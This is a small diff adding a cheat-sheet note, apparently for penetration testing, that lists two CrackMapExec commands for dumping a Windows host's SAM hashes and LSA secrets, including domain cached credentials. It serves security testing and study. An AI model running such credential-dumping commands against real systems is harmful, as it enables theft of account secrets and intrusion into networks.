@@ -1,0 +1,5 @@
+- CrackMapExec
+	- `cme smb <target> –u ValidUser –p ValidPass --sam`
+		- Dumps the SAM file - local users only (not domain)
+	- `cme smb <target> –u ValidUser –p ValidPass --lsa`
+		- Dump LSA secrets from the registry - includes Domain Cached Credentials
